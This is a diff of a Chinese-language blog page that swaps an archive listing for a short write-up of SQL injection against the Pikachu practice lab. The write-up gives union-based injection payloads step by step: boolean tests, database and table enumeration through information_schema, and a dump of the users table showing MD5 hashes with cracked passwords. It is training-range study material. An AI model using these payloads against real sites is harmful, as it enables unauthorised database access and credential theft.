@@ -3,16 +3,20 @@
 <html class="article-header-style-default">
 <head>
 	
-	<title>归档 - ENIC&#39;s home</title>
+	<title>picachu靶场 sql注入(post) - ENIC&#39;s home</title>
 	<meta charset="utf-8">
 	
 		<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
 	
-	<meta property="og:type" content="website">
-<meta property="og:title" content="ENIC&#39;s home">
-<meta property="og:url" content="https://lxy6515.github.io/archives/index.html">
+	<meta name="description" content="1.直接抓包看到id&#x3D;1,试试能不能注入用id&#x3D;1 and 1&#x3D;1 依然可以查出 再试id&#x3D;1 and 1&#x3D;2 无法查出 ,存在sql注入 2输入 id&#x3D;2 or 1 出现所有信息  3构造id&#x3D;2 union select 1,2 出现 12hello,1your email is: 2 4故将2改为 database() 获取库名pikachu 5将2改为schema_name from in">
+<meta property="og:type" content="website">
+<meta property="og:title" content="picachu靶场 sql注入(post)">
+<meta property="og:url" content="https://lxy6515.github.io/pikachu/ctf%20sql%E6%B3%A8%E5%85%A51.html">
 <meta property="og:site_name" content="ENIC&#39;s home">
+<meta property="og:description" content="1.直接抓包看到id&#x3D;1,试试能不能注入用id&#x3D;1 and 1&#x3D;1 依然可以查出 再试id&#x3D;1 and 1&#x3D;2 无法查出 ,存在sql注入 2输入 id&#x3D;2 or 1 出现所有信息  3构造id&#x3D;2 union select 1,2 出现 12hello,1your email is: 2 4故将2改为 database() 获取库名pikachu 5将2改为schema_name from in">
 <meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2021-03-07T08:04:42.000Z">
+<meta property="article:modified_time" content="2021-03-10T13:42:38.077Z">
 <meta property="article:author" content="enic">
 <meta name="twitter:card" content="summary">
 
@@ -472,7 +476,7 @@
 			
 			
 				<ul id='leftbar_part1_menu' class='leftbar-menu'>
-					<li class='leftbar-menu-item'><a href='/'>首页</a></li><li class='leftbar-menu-item current'><a href='/archives'>归档</a></li><li class='leftbar-menu-item'><a href='/about'>关于</a></li>
+					<li class='leftbar-menu-item'><a href='/'>首页</a></li><li class='leftbar-menu-item'><a href='/archives'>归档</a></li><li class='leftbar-menu-item'><a href='/about'>关于</a></li>
 				</ul>
 			
 			<div class="card-body text-center leftbar-search-button">
@@ -584,79 +588,70 @@
 	<main id="main" class="site-main" role="main">
 		
 		
-		
-				<article class="post post-full card bg-white shadow-sm border-0">
+			
+
+	<article class="post post-full card bg-white shadow-sm border-0 ">
 	<header class="post-header text-center">
-		<a class="post-title" href="/archives/">归档</a>
+		
+		<a class="post-title" href="/pikachu/ctf%20sql%E6%B3%A8%E5%85%A51.html">picachu靶场 sql注入(post)</a>
+		<div class="post-meta">
+			
+						
+						<div class="post-meta-detail post-meta-detail-time">
+							<i class="fa fa-clock-o" aria-hidden="true"></i>
+							<time title="发布于 2021-3-7 16:04:42 | 编辑于 2021-3-10 21:42:38">2021-3-7 16:04
+							</time>
+						</div>
+					
+						
+							<div class="post-meta-devide">|</div>
+						
+						<div class="post-meta-detail post-meta-detail-words">
+							<i class="fa fa fa-book" aria-hidden="true"></i>
+							<span id="busuanzi_container_page_pv">
+								阅读<span id="busuanzi_value_page_pv"></span>次
+							</span>
+						</div>
+					
+						
+							<div class="post-meta-devide">|</div>
+						
+						<div class="post-meta-detail post-meta-detail-words">
+							<i class="fa fa-file-word-o" aria-hidden="true"></i>
+							213 字
+						</div>
+					
+						
+							<div class="post-meta-devide">|</div>
+						
+						<div class="post-meta-detail post-meta-detail-readingtime">
+							<i class="fa fa-hourglass-end" aria-hidden="true"></i>
+							1 分钟
+						</div>
+					
+		</div>
+		
 	</header>
 
 	<div class="post-content" id="post_content">
-		<div class='argon-timeline'>
-			
-						<div class='argon-timeline-node'>
-							<div class='argon-timeline-time archive-timeline-year'>2021</div>
-							<div class='argon-timeline-card card bg-gradient-secondary archive-timeline-title'></div>
-						</div>
-						
-					<div class='argon-timeline-node'>
-						<div class='argon-timeline-time'>3-8</div>
-						<div class='argon-timeline-card card bg-gradient-secondary archive-timeline-title'>
-							<a href="/2021/03/08/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/">报错注入基础</a>
-						</div>
-					</div>
-			
-					<div class='argon-timeline-node'>
-						<div class='argon-timeline-time'>2-26</div>
-						<div class='argon-timeline-card card bg-gradient-secondary archive-timeline-title'>
-							<a href="/2021/02/26/html%E7%89%B9%E6%AE%8A%E7%AC%A6%E5%8F%B7/">html特殊符号</a>
-						</div>
-					</div>
-			
-					<div class='argon-timeline-node'>
-						<div class='argon-timeline-time'>2-26</div>
-						<div class='argon-timeline-card card bg-gradient-secondary archive-timeline-title'>
-							<a href="/2021/02/26/md5%E7%BB%95%E8%BF%87/">md5绕过</a>
-						</div>
-					</div>
-			
-					<div class='argon-timeline-node'>
-						<div class='argon-timeline-time'>2-24</div>
-						<div class='argon-timeline-card card bg-gradient-secondary archive-timeline-title'>
-							<a href="/2021/02/24/js%E5%AD%A6%E4%B9%A0/">js学习</a>
-						</div>
-					</div>
-			
-					<div class='argon-timeline-node'>
-						<div class='argon-timeline-time'>2-21</div>
-						<div class='argon-timeline-card card bg-gradient-secondary archive-timeline-title'>
-							<a href="/2021/02/21/github%E9%82%AE%E7%AE%B1%E6%9F%A5%E8%AF%A2/">信息收集之查找GitHub作者邮箱</a>
-						</div>
-					</div>
-			
-					<div class='argon-timeline-node'>
-						<div class='argon-timeline-time'>2-21</div>
-						<div class='argon-timeline-card card bg-gradient-secondary archive-timeline-title'>
-							<a href="/2021/02/21/local%E4%BC%AA%E9%80%A0/">ctf学习</a>
-						</div>
-					</div>
-			
-					<div class='argon-timeline-node'>
-						<div class='argon-timeline-time'>2-19</div>
-						<div class='argon-timeline-card card bg-gradient-secondary archive-timeline-title'>
-							<a href="/2021/02/19/hexo%E6%95%99%E5%AD%A6/">hexo教学与常用标签</a>
-						</div>
-					</div>
-			
-					<div class='argon-timeline-node'>
-						<div class='argon-timeline-time'>2-19</div>
-						<div class='argon-timeline-card card bg-gradient-secondary archive-timeline-title'>
-							<a href="/2021/02/19/markdown%E6%95%99%E5%AD%A6/">markdown教学</a>
-						</div>
-					</div>
-			
-		</div>
+		<p>1.直接抓包看到id=1,试试能不能注入用id=1 and 1=1 依然可以查出 再试id=1 and 1=2 无法查出 ,存在sql注入</p>
+<p>2输入 id=2 or 1 出现所有信息 </p>
+<p>3构造id=2 union select 1,2 出现</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hello,1</span><br><span class="line">your email is: 2</span><br></pre></td></tr></table></figure>
+<p>4故将2改为 database() 获取库名pikachu</p>
+<p>5将2改为schema_name from information_schema.schemata查询所有库名</p>
+<p>6将2改为table_name from information_schema.tables where table_schema=database()查询到表名 httpinfo,member,message,users,xssblind </p>
+<p>7查询字段column_name from information_schema.columns where table_name=’users’ and table_schema=database()查询users表的字段 id,username,password,level</p>
+<p>8 id=2 union select <code>username</code>,<code>password</code> FROM <code>users</code>  这样查询到所有user和password</p>
+<p>admin<br>e10adc3949ba59abbe56e057f20f883e  (123456)</p>
+<p>pikachu<br>670b14728ad9902aecba32e22fa4f6bd (000000)</p>
+<p>test<br>e99a18c428cb38d5f260853678922e03 (abc123)</p>
+
 	</div>
 </article>
+
+
+		
 		
 		
 		
